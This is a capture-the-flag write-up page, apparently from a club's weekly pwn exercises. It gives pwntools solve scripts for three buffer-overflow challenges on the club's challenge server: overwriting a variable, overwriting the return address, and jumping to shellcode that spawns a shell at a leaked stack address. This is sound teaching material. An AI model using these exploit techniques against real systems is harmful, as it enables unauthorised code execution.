+++
title = "Week 01"
weight = 0
slug="week-01"
description = "- Flag Hole: buffer overflow overwrite variable<br>- Login: bof overwrite RIP<br>- Sally: bof jump to shellcode at leaked stack address"
+++

# Flag Hole
Buffer overflow to overwrite a variable

Solve script:
``` py
from pwn import *

port= 7003
p = remote("pwn.cybr.club", port)
#p = process('./flag_hole')

p.recv()
p.send(b'\x00'*100)

p.interactive()
# looking at the assembly, the fd for /dev/null is stored at rbp-0xc, gets input is stored at rbp-0x70
# 0x70 - 0x0c = 100, overwrite it with 0 which is the fd for stdout
```

# Login
Buffer overflow to overwrite return instruction pointer

Solve script:
``` py
from pwn import *

port= 7000
p = remote("pwn.cybr.club", port)

win = p64(0x4011a2)

p.sendline(b'A'*40 + win)
p.sendline(b'lmao')

p.interactive()
```

# Sally
Given a leaked stack address, write shellcode and jump to it

Solve script:
``` py
from pwn import *

port= 7007
p = remote("pwn.cybr.club", port)
#p = process('./sally')
elf = ELF('./sally')
context.arch = elf.arch

shellcode = asm(shellcraft.sh())

p.recvuntil(b'There are ')
leak = int(p.recvuntil(b' sea').split(b' ')[0].decode(), 16)

p.sendline(shellcode+ b'A'*(136-len(shellcode)) + p64(leak))

p.interactive()
```
